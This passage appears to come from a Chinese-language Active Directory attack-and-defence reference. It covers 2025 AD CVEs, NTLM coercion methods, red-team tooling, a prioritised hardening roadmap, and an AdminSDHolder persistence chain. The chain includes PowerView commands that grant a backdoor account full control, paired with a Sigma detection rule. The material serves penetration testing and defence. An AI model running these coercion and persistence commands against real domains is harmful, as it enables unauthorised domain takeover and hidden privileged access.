1. LDAP 签名被管理员显式禁用
2. LDAPS 未启用通道绑定
3. 非 DC 服务器的 SMB 签名未强制
4. LmCompatibilityLevel 配置错误
5. CVE-2025-54918（反射绕过）
6. CVE-2025-33073（SMB 反射）

参考:
- decoder.cloud: "What Windows Server 2025 Quietly Did to Your NTLM Relay" (2026.02)
- SpecterOps: "The Renaissance of NTLM Relay Attacks"
- Hive Security: "NTLM Relay in 2026: Microsoft Declared It Dead. Attackers Didn't."
```

---

### 25. 2025-2026 AD 关键 CVE 速查

| CVE | 严重性 | 类型 | 影响 | 修复/发现时间 |
|-----|--------|------|------|--------------|
| CVE-2025-54918 | 8.8 High | NTLM LDAP 认证绕过 | 域用户→DCSync→完整域沦陷 | 2025-09 发现 |
| CVE-2025-33073 | High | NTLM 反射 SMB 提权 | 域用户→机器admin→横向移动 | 2025 Patch Tuesday |
| CVE-2025-29968 | Important | AD CS 输入验证不当 | AD CS DoS | 2025 Patch Tuesday |
| CVE-2025-29810 | Important | AD 权限提升 | 域内提权 | 2025-04 修复 |
| CVE-2025-21293 | Important | AD DS 权限提升 | 域内提权 | 2025-01 披露 |
| CVE-2025-26647 | Important | Kerberos 输入验证不当 | Kerberos 提权 | 2025 Patch Tuesday |
| CVE-2025-32724 | High | Win-DDoS 域控内存耗尽 | 域控 DDoS | 2025 |
| BadSuccessor | Critical | dMSA 设计缺陷（无 CVE） | 完整域接管 | 2025（截至6月未修复） |

---

### 26. 认证强制（Coercion）方法全面更新

**来源**: RedTeam Pentesting 2025 综合指南 / p0dalirius GitHub

```
方法              | 协议         | 需认证 | WS2025 可用 | 备注
------------------|-------------|--------|------------|------
PrinterBug        | MS-RPRN     | 是     | 是         | 经典方法
PetitPotam        | MS-EFSRPC   | 否     | 是         | 无需认证
ShadowCoerce      | MS-FSRVP    | 是     | 是         | 文件服务
DFSCoerce         | MS-DFSNM    | 否     | 是         | DFS命名
NightMare         | MS-EVEN     | 否     | 是         | 事件服务
ChefCoerce        | MS-RAA      | 否     | 否(默认禁用)| 远程协助
PullCoerce        | MS-SCMR     | 是     | 是         | 服务控制
DFSPetit          | MS-DFSNM v2 | 否     | 是         | DFS变体
SpoolSampler      | MS-RPRN     | 是     | 是         | 采样模式
ShadowCoerce v2   | MS-FSRVP    | 是     | 部分受限   | 增强版
```

**工具更新**:

```bash
# Coercer — 自动枚举所有 coercion 方法（2025 更新）
coercer -u user -p password -d domain.com -t TARGET_IP --autodetect

# p0dalirius/windows-coerced-authentication-methods
# GitHub: https://github.com/p0dalirius/windows-coerced-authentication-methods
# 维护所有已知方法的最新列表
```

---

### 27. 工具生态更新 (2025-2026)

| 工具 | 类型 | 更新 | 说明 |
|------|------|------|------|
| BloodHound CE v8 | 侦察 | **重大更新** | OpenGraph 架构，支持任意平台攻击路径 |
| Certipy | ADCS | 活跃维护 | 支持 ESC1-ESC16，ESC16 新增 |
| NetExec | 枚举/横向 | 活跃维护 | 完全替代 CrackMapExec，AES Kerberos 支持 |
| Coercer | 认证强制 | 活跃维护 | 2025 新增自动检测模式 |
| Impacket | 全链路 | 活跃维护 | CVE-2025-54918 相关脚本 |
| Rubeus | Kerberos | 活跃维护 | dMSA / Shadow Credentials 更新 |
| Whisker | Shadow Credentials | 活跃维护 | msDS-KeyCredentialLink |
| evil-winrm | WinRM | 活跃维护 | Kerberos AES + LDAPS 支持 |
| ROADtools | Entra ID | 活跃维护 | Entra ID 攻击路径 |
| AADInternals | Azure/混合 | 活跃维护 | BadSuccessor 相关检测 |
| adhammer | AD 审计/验证 | 新兴(Rust) | 单二进制 AD 审计+RBCD/Shadow Credentials PKINIT 验证，PingCastle 级 |

---

### 28. 中文社区精华参考

| 来源 | 主题 | 链接 |
|------|------|------|
| 安全客 | CVE-2025-29810 AD 域权限提升 | https://www.anquanke.com/post/id/306338 |
| 腾讯云 | BadSuccessor 域控接管（影响所有 WS2025） | https://cloud.tencent.com/developer/news/2612906 |
| 阿里云 | 10种常见 Active Directory 攻击 | https://developer.aliyun.com/article/1662188 |
| CSDN | Active Directory 安全加固手册（Server 2025） | https://blog.csdn.net/m5n6o7/article/details/154723598 |
| 安全客 | 集权攻击避实击虚 — AD 域安全解析 | https://www.anquanke.com/post/id/287523 |
| 阿里云 | Kerberos 认证攻击 | https://developer.aliyun.com/article/1215230 |
| GitHub | Hunting-Active-Directory 域渗透 Tricks | https://github.com/XTeam-Wing/Hunting-Active-Directory |
| 火山引擎 | 域渗透学习 | https://developer.volcengine.com/articles/7381529183358287922 |

---

### 29. 防御升级路线图 (P0-P3)

| 优先级 | 措施 | 防御的攻击 | 验证方法 |
|--------|------|-----------|---------|
| **P0** | 安装 CVE-2025-54918 / CVE-2025-33073 补丁 | NTLM 反射/中继提权 | `wmic qfe list \| findstr KB` |
| **P0** | 检查 dMSA 配置，限制创建权限 | BadSuccessor | `Get-ADObject -LDAPFilter "(objectClass=msDS-DelegatedManagedServiceAccount)"` |
| **P0** | 强制 LDAP 签名 + 通道绑定 | NTLM Relay 到 LDAP | 注册表 `LDAPServerIntegrity = 2` |
| **P0** | 强制 SMB 签名（所有 DC） | SMB 中继 | `Get-SmbServerConfiguration \| Select EnableSMB2Signing` |
| **P0** | 部署 Windows LAPS v2 | 横向移动 via 本地管理员 | `Get-LapsADPassword` 测试 |
| **P1** | 审计 ADCS 模板（ESC1-ESC16） | 证书滥用提权 | `certipy find -vulnerable` |
| **P1** | 确保 `StrongCertificateBindingEnforcement = 2` | ESC10/ESC16 | 注册表检查 |
| **P1** | 启用 EPA on AD CS HTTP 端点 | PetitPotam → ESC8 | IIS 配置检查 |
| **P1** | 实施 Tier Model 分层 | 全链路凭据窃取 | GPO 登录限制审计 |
| **P1** | 部署 Credential Guard | LSASS Dump | `Get-CimInstance -ClassName Win32_DeviceGuard` |
| **P1** | krbtgt 双密码滚动（每年2次） | Golden Ticket | `Get-ADUser krbtgt -Properties PasswordLastSet` |
| **P2** | 禁用 RC4 Kerberos | Kerberoasting | `Get-ADUser -Filter * -Properties msDS-SupportedEncryptionTypes` |
| **P2** | 限制 MachineAccountQuota | 机器账户滥用 | `Get-ADObject -Identity "DC=domain,DC=com" -Properties ms-DS-MachineAccountQuota` |
| **P2** | 部署 Defender for Identity / ATA | 全链路检测 | 服务运行状态 |
| **P2** | 监控 msDS-KeyCredentialLink 修改 | Shadow Credentials | Event ID 5136 过滤 |
| **P3** | 审计 GPO 权限和 WMI 筛选器 | GPO 滥用持久化 | `Get-GPO -All \| Get-GPPermission` |

---

### 30. AdminSDHolder / SDProp 攻击链（持久化）

**原理**: `CN=AdminSDHolder,CN=System,DC=...` 是一个模板对象，其 ACL 被 SDPROP（SD Propagator）进程每 60 分钟复制到所有「受保护组」（Domain Admins/Enterprise Admins/Administrators/Schema Admins 等）及其成员。攻击者只需对 AdminSDHolder 对象写 ACL（给受控账户 `GenericAll`/`WriteDacl`），60 分钟内该权限会自动传播到全部特权账户——实现**全域特权持久化**，且修改点（AdminSDHolder）与生效点（各特权组）分离，隐蔽性强。

**条件**: 攻击者对 AdminSDHolder 对象有 WriteDacl/GenericAll（域管或已提权）。

```bash
# 攻击链（授权测试）
# 1) 给 AdminSDHolder 添加受控账户的 Full Control ACL
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName backdoor_user \
  -Rights All -Verbose

# 2) 等待 SDProp 周期（默认 60 分钟）或强制触发
#    强制触发: 修改 AdminSDHolder 的 adminCount/描述 触发（或用脚本跑 SDProp）
#    Invoke-ADSDPropagation 思路：修改对象触发复制

# 3) 传播后：backdoor_user 对 Domain Admins 组及成员有 Full Control
#    → 重置管理员口令 / 加组 / DCSync，实现全域持久化
```

**检测**:
```yaml
title: AdminSDHolder ACL Modification
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    ObjectDN|contains: 'CN=AdminSDHolder,CN=System'
  condition: selection
level: high
tags:
  - attack.t1098
```

**关键检测点**:
- Event 5136：`ObjectDN` 含 `CN=AdminSDHolder,CN=System` 的 `nTSecurityDescriptor` 修改。
- SDProp 传播特征：60 分钟周期内大量受保护组 `adminCount=1` + ACL 变更（Event 5136 批量）。
- 可疑账户出现在特权组 ACL 中（BloodHound 查「GenericAll on Domain Admins」）。

**防御**: 1) 监控 AdminSDHolder ACL 变更 2) 定期审计受保护组 ACL 3) `adminCount=1` 对象清单核对 4) 限制对 AdminSDHolder 的写入。

---

## 前置条件

- 已获取初始域账户凭据或网络访问权限
- Impacket 套件 / NetExec / BloodHound CE v8 已安装
- 对于 Windows: PowerView / Rubeus / Mimikatz 可用
- 了解 Kerberos 协议基础
- 混合环境: 了解 Azure AD / Entra ID 基础知识
